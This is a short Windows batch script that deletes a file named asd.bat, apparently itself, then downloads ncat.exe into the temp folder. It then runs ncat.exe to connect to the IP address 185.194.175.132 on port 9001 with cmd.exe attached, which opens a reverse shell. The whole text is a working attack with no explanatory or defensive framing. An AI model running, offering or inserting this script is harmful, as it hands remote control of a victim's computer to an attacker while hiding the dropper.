del /f /q "asd.bat"
cd %temp%
curl -L https://github.com/cyberisltd/NcatPortable/raw/refs/heads/master/ncat.exe -o ncat.exe
ncat.exe 185.194.175.132 9001 -e cmd.exe
